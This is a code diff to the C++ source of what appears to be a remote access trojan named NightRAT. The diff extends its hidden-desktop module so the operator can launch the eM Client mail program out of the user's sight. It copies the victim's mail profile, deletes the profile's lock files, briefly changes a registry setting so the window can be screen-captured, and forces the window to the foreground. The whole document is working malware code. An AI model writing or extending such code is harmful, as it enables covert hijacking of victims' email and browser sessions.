@@ -88,6 +88,46 @@ static wstring g_desktopName = L"NightRAT_HiddenDesktop";
 static mutex g_gdiplusMutex;
 static ULONG_PTR g_gdiplusToken = 0;
 
+static atomic<DWORD> g_emClientPid(0);
+static atomic_bool g_emClientRestored(false);
+
+static bool g_hadHwAccelVal = false;
+static DWORD g_oldHwAccelVal = 0;
+
+static void set_hw_acceleration_disabled() {
+    HKEY hKey;
+    g_hadHwAccelVal = false;
+    g_oldHwAccelVal = 0;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
+        DWORD type = 0;
+        DWORD size = sizeof(DWORD);
+        if (RegQueryValueExW(hKey, L"DisableHWAcceleration", NULL, &type, (LPBYTE)&g_oldHwAccelVal, &size) == ERROR_SUCCESS) {
+            g_hadHwAccelVal = true;
+        }
+        DWORD newVal = 1;
+        RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&newVal, sizeof(DWORD));
+        RegCloseKey(hKey);
+    } else {
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            DWORD newVal = 1;
+            RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&newVal, sizeof(DWORD));
+            RegCloseKey(hKey);
+        }
+    }
+}
+
+static void restore_hw_acceleration() {
+    HKEY hKey;
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Avalon.Graphics", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        if (g_hadHwAccelVal) {
+            RegSetValueExW(hKey, L"DisableHWAcceleration", 0, REG_DWORD, (const BYTE*)&g_oldHwAccelVal, sizeof(DWORD));
+        } else {
+            RegDeleteValueW(hKey, L"DisableHWAcceleration");
+        }
+        RegCloseKey(hKey);
+    }
+}
+
 // Capture -> Encode -> Send pipeline.
 // HBITMAP objects are cached in fixed slots and reused until the frame size changes.
 struct BitmapSlot {
@@ -944,6 +984,29 @@ static void capture_loop() {
             } param = { &windows };
             auto EnumCallback = [](HWND hwnd, LPARAM lParam) -> BOOL {
                 auto p = reinterpret_cast<EnumParam*>(lParam);
+
+                DWORD emPid = g_emClientPid.load();
+                if (emPid != 0 && !g_emClientRestored.load()) {
+                    DWORD procId = 0;
+                    GetWindowThreadProcessId(hwnd, &procId);
+                    if (procId == emPid) {
+                        HWND parent = GetParent(hwnd);
+                        HWND owner = GetWindow(hwnd, GW_OWNER);
+                        if (!parent && !owner) {
+                            wchar_t title[256] = {0};
+                            GetWindowTextW(hwnd, title, 256);
+                            LONG style = GetWindowLongW(hwnd, GW_STYLE);
+                            if (wcslen(title) > 0 && (style & WS_CAPTION)) {
+                                ShowWindow(hwnd, SW_RESTORE);
+                                SetForegroundWindow(hwnd);
+                                SetActiveWindow(hwnd);
+                                SetFocus(hwnd);
+                                g_emClientRestored = true;
+                            }
+                        }
+                    }
+                }
+
                 if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
                     p->list->push_back(hwnd);
                 }
@@ -2131,6 +2194,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             g_staticFrameCount = 0;
             g_forceFullFrame = false;
             g_lastInteractiveFullFrameTick = 0;
+            g_emClientPid = 0;
+            g_emClientRestored = false;
             {
                 lock_guard<mutex> lock(g_inputMutex);
                 g_inputQueue.clear();
@@ -2156,7 +2221,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2244,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2211,6 +2278,14 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             wchar_t localApp[MAX_PATH] = {0};
                             SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localApp);
                             exePath = wstring(localApp) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        exePath = get_app_path(L"MailClient.exe");
+                        if (exePath.empty()) {
+                            exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
+                        }
+                        if (!fs::exists(exePath)) {
+                            exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
                         }
                     } else {
                         exePath = get_app_path(exeName);
@@ -2275,7 +2350,15 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
 
                     } else if (copyProfile) {
-                        wstring sourceUserData = get_browser_profile_path(wRequestedPath);
+                        wstring sourceUserData;
+                        if (wRequestedPath == L"eM Client") {
+                            wchar_t szPath[MAX_PATH];
+                            if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) == S_OK) {
+                                sourceUserData = wstring(szPath) + L"\\eM Client";
+                            }
+                        } else {
+                            sourceUserData = get_browser_profile_path(wRequestedPath);
+                        }
 
                         if (sourceUserData.empty() || !fs::exists(sourceUserData)) {
                             send_error("User Data directory not found.");
@@ -2303,18 +2386,20 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             return;
                         }
 
-                        WIN32_FIND_DATAW findData;
-                        HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
-                        if (hFind != INVALID_HANDLE_VALUE) {
-                            do {
-                                wstring name = findData.cFileName;
-                                if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
-                                    (name == L"Default" || name.find(L"Profile ") == 0)) {
-                                    profileDir = name;
-                                    break;
-                                }
-                            } while (FindNextFileW(hFind, &findData));
-                            FindClose(hFind);
+                        if (wRequestedPath != L"eM Client") {
+                            WIN32_FIND_DATAW findData;
+                            HANDLE hFind = FindFirstFileW((sourceUserData + L"\\*").c_str(), &findData);
+                            if (hFind != INVALID_HANDLE_VALUE) {
+                                do {
+                                    wstring name = findData.cFileName;
+                                    if ((findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
+                                        (name == L"Default" || name.find(L"Profile ") == 0)) {
+                                        profileDir = name;
+                                        break;
+                                    }
+                                } while (FindNextFileW(hFind, &findData));
+                                FindClose(hFind);
+                            }
                         }
                         profilePath = tempProfileRoot;
                     }
@@ -2343,6 +2428,12 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        if (copyProfile && !profilePath.empty()) {
+                            args = L" /dblocation \"" + profilePath + L"\"";
+                        } else {
+                            args = L"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
@@ -2430,6 +2521,10 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                                 fs::remove(fs::path(profilePath) / L"lock");
                                 fs::remove(fs::path(profilePath) / L".parentlock");
                                 fs::remove(fs::path(profilePath) / L"xulstore.json");
+                            } else if (wRequestedPath == L"eM Client") {
+                                fs::remove(fs::path(profilePath) / L"SingletonLock");
+                                fs::remove(fs::path(profilePath) / L"SingletonSocket");
+                                fs::remove(fs::path(profilePath) / L"SingletonCookie");
                             } else {
                                 fs::remove(fs::path(profilePath) / L"SingletonLock");
                                 fs::remove(fs::path(profilePath) / L"SingletonSocket");
@@ -2463,13 +2558,32 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         SetEnvironmentVariableW(L"MOZ_WEBRENDER", L"software");
                     }
 
+                    if (wRequestedPath == L"eM Client") {
+                        set_hw_acceleration_disabled();
+                    }
+
                     if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE,
                                        0, NULL, NULL, &si, &pi)) {
+                        if (wRequestedPath == L"eM Client") {
+                            g_emClientPid = pi.dwProcessId;
+                            g_emClientRestored = false;
+                            thread([]() {
+                                Sleep(3000);
+                                restore_hw_acceleration();
+                            }).detach();
+                        }
                         CloseHandle(pi.hProcess);
                         CloseHandle(pi.hThread);
                         request_full_frame(true);
-                        send_status("Browser started on hidden desktop");
+                        if (wRequestedPath == L"eM Client") {
+                            send_status("eM Client started on hidden desktop");
+                        } else {
+                            send_status("Browser started on hidden desktop");
+                        }
                     } else {
+                        if (wRequestedPath == L"eM Client") {
+                            restore_hw_acceleration();
+                        }
                         send_error("Failed to start browser. Error: " + to_string(GetLastError()));
                     }
 
